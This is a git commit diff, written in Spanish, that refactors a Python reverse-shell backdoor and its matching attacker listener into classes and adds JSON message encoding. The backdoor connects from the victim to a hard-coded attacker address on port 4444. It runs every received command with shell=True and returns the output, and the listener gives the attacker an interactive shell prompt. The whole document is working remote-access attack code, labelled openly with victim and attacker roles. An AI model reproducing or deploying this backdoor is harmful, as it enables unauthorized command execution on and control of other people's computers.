e0fbec3c7c81767ded7cf7ae064b3958619c44c2
Fegamon <fegamon1999@gmail.com>
2022-02-10 00:22:59 -0500

    Se convirtieron el backdoor y el servidor TCP en Clases (POO), además se implementó el formato Json para codificar los datos enviados con el fin de mejorar la integridad de los mismos

--- reverseTcp.py
+++ reverseTcp.py
@@ -1,20 +1,42 @@
 import socket
 import subprocess
+import json
 
-def runCommand(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((bytes(ip, 'utf-8'), port)) #La víctima establece conexión con la computadora atacante
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #Codificación json:
+    def reliableSend(self, data):
+        jsonData = json.dumps(data.decode('utf-8'))
+        self.connection.send(bytes(jsonData, 'utf-8'))
 
-try:
-    connection.connect((b'192.168.1.14', 4444)) #La víctima establece conexión con la computadora atacante
+    #Decodificación json:
+    def reliableRecieve(self):
+        jsonData = ''
+        while True:
+            try:
+                jsonData = self.connection.recv(1024)
+                return json.loads(jsonData.decode('utf-8'))
+            
+            except ValueError: continue
     
-    while True: #Permite al programa ejecutarse indefinidamente
-        command = connection.recv(1024) #Recibe toda la información que le enviemos(En este caso, comandos de consola)
-        commandResults = runCommand(command)
-        connection.send(commandResults)
+    def runCommand(self, command):
+        return subprocess.check_output(command, shell=True)
 
-except KeyboardInterrupt:
-    connection.send(b'El cliente ha finalizado la conexion')
-    connection.close()
-    print('\nConexión finalizada')
+    def run(self):
+        try:
+            while True: #Permite al programa ejecutarse indefinidamente
+                command = self.reliableRecieve() #Recibe toda la información que le enviemos(En este caso, comandos de consola)
+                commandResults = self.runCommand(command)
+                self.reliableSend(commandResults)
+
+        except KeyboardInterrupt:
+            self.reliableSend(b'El cliente ha finalizado la conexion')
+            self.connection.close()
+            print('\nConexión finalizada')
+
+
+backdoor = Backdoor('192.168.1.14', 4444)
+backdoor.run()
--- tcpServer.py
+++ tcpServer.py
@@ -1,21 +1,49 @@
 import socket
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reestablece la conexión en caso de que se pierdan los paquetes (Reusa Address)
+import json
 
-listener.bind(('192.168.1.14', 4444))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reestablece la conexión en caso de que se pierdan los paquetes (Reusa Address)
+
+        listener.bind((ip, port))
+    
+        listener.listen(0)
+
+        print('Servidor inicializado, esperando por conexiones')
+        self.connection, address = listener.accept() #Aceptar conexiones
+        print(f'[+] Conexión establecida con {address}\n')
+
+    #Es importante mantener una integridad de los datos, es decir, asegurarnos de que ningún paquete se pierda durante la comunicación
+    #Para ello es necesario convertirlos en formato json
+    #Codificación json:
+    def reliableSend(self, data):
+        jsonData = json.dumps(data)
+        self.connection.send(bytes(jsonData, 'utf-8'))
+
+    #Decodificación json:
+    def reliableRecieve(self):
+        jsonData = ''
+        while True:
+            try:
+                jsonData = self.connection.recv(4096)                
+                return json.loads(jsonData.decode('utf-8'))
+            
+            except ValueError: continue
+
+    def remoteAction(self, command):
+        self.reliableSend(command)
+        return self.reliableRecieve()
+
+    def run(self):
+            while True:
+                command = input('Shell>> ')             
+                result = self.remoteAction(command)
+                print(result)
 
 try:
-    listener.listen(0)
-
-    print('Esperando conexiones')
-    connection, address = listener.accept() #Aceptar conexiones
-    print(f'[+] Conexión establecida con {address}')
-
-    while True:
-        command = input('Shell>> ')
-        connection.send(bytes(command, 'utf-8'))
-        result = connection.recv(4096)
-        print(result.decode('utf-8'))
+    listener = Listener('192.168.1.14', 4444)
+    listener.run()
 
 except KeyboardInterrupt:
-    print('\nPrograma finalizado')
+    print('\nPrograma Finalizado')
